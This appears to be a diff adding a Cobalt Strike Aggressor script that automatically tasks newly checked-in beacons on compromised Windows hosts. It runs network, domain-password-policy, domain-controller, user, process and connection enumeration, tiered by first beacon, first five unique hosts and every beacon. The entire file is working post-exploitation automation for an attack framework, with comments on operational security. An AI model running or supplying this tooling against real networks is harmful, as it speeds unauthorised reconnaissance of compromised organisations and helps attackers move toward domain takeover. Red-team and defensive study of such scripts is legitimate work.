@@ -1,0 +1,88 @@
+#Conducts initial recon/enumeration for initial check in of new beacons
+#Commands are split by first beacon, first 5 unique beacons, and every beacon
+
+#Use Windows API everywhere https://blog.cobaltstrike.com/2017/06/23/opsec-considerations-for-beacon-commands/
+#Custome C# with execute assembly for everything else
+##################ToDo: ##################
+#Check if the IP is in scope (iprange)
+#Switch bshell to run (waiting for update to 3.12)
+#Querry Registry for powershell version first 5
+#Popup box with options for how to run
+#Change color of PS
+##########################################
+
+sub winVer {
+    $ver = binfo($1,'ver');
+     if ($ver eq "6.1"){
+        $version = "Win7/2008";
+     }
+     else if ($ver eq "6.2"){
+        $version = "Win8/2012";
+     }
+     else if ($ver eq "6.3"){
+        $version = "Win8.1/2012 R2";
+     }
+     else if ($ver eq "10.0"){
+        $version = "Win10/2016";
+     }
+     else{
+        $version = "Unknown";
+     }
+     return $version;
+}
+
+
+on beacon_initial {
+
+    ### Do on every new beacon
+    blog($1,"Initial check in tasking:");
+    bsleep ($1,5,0);
+    $windowsVersion = winVer($1);
+    $ts = formatDate('MM/dd HH:mm:ss (z)');
+    bnote($1,"New: $ts $+  - $windowsVersion");
+    bshell($1,"ipconfig");
+    bpwd($1);
+
+
+    ### Do on first beacon
+
+    if (size(beacons()) == 1){
+        blog($1,"First beacon tasking: ");
+        bshell($1,"net accounts /domain");
+        bnet($1,'dclist');
+    }
+
+
+    ### Do on first 5 unique beacon(by computer name)
+
+    $listOfBeacons = beacons();  #Get list of beacons for modification
+    $cur = pop($listOfBeacons);  #Remove current beacon from list
+
+    #Removes all duplicates from list
+    for ($x = 0; $x < size($listOfBeacons); $x++) {
+        for ($y = $x + 1; $y < size($listOfBeacons); $y++) {
+            if ($listOfBeacons[$x]['computer'] eq $listOfBeacons[$y]['computer']) {
+                removeAt($listOfBeacons, $y);
+                $y = $y - 1;    #If found bring y back one so it does not skip
+            }
+        }
+    }
+
+    #Checks if size of list is smaller than 5 thus making the current beacon one of the first 5 unique. Also make sure the current beacon is not a duplicate
+    if (size($listOfBeacons) < 5) {
+        $dup =  0;
+        foreach $beacon ($listOfBeacons) {
+            if ($cur['computer'] eq $beacon['computer']){
+                $dup = 1;
+                break;
+            }
+        }
+
+        if ($dup == 0) {
+            blog($1,"First 5 unique beacon tasking:");
+            bps($1);
+            bnet($1, 'user');
+            bshell($1, "netstat -ano");
+        }
+    }
+}
